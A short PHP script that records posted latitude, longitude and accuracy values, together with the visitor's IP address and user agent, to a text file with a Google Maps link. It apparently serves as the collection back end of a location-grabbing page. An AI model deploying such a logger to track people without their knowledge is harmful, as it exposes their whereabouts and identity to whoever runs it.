<?php
header('Content-Type: text/html');
$lat = $_POST['Lat'];
$lon = $_POST['Lon'];
$acc = $_POST['Acc'];
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$data = "Google Map Link : https://www.google.com/maps/place/" . $lat . "+" . $lon . "\n";
$data .= "Accuracy : " . $acc . " meters\n";
$data .= "IP Address : " . $ip . "\n";
$data .= "User Agent : " . $user_agent . "\n";

$file = fopen('result.txt', 'w');
fwrite($file, $data);
fclose($file);
?>
